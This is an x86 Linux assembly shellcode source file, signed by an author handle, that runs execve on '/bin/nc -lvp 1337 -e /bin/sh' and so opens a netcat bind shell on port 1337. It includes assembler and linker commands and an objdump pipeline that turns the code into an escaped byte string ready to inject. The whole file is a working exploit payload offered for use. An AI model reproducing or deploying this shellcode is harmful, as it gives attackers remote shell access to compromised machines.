; execve x86 /bin/nc -lvp 1337 -e /bin/sh - 60 bytes   by 0bfxgh0st*
;
; nasm -f elf execve_x86_nc-lvp_1337-e_sh.asm
; ld -o execve_x86_nc-lvp_1337-e_sh execve_x86_nc-lvp_1337-e_sh.o -m elf_i386
; objdump -d execve_x86_nc-lvp_1337-e_sh |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor eax,eax
xor ecx,ecx
xor edx,edx

push eax
push 0x636e2f6e
push 0x69622f2f
mov ebx,esp

push eax
push 0x37333331
push 0x70766c2d
mov esi,esp

push eax
push 0x68732f6e
push 0x69622f2f
push 0x2f2f652d
mov edi,esp

push eax
push edi
push esi
push ebx

mov ecx,esp

mov al,11
int 0x80
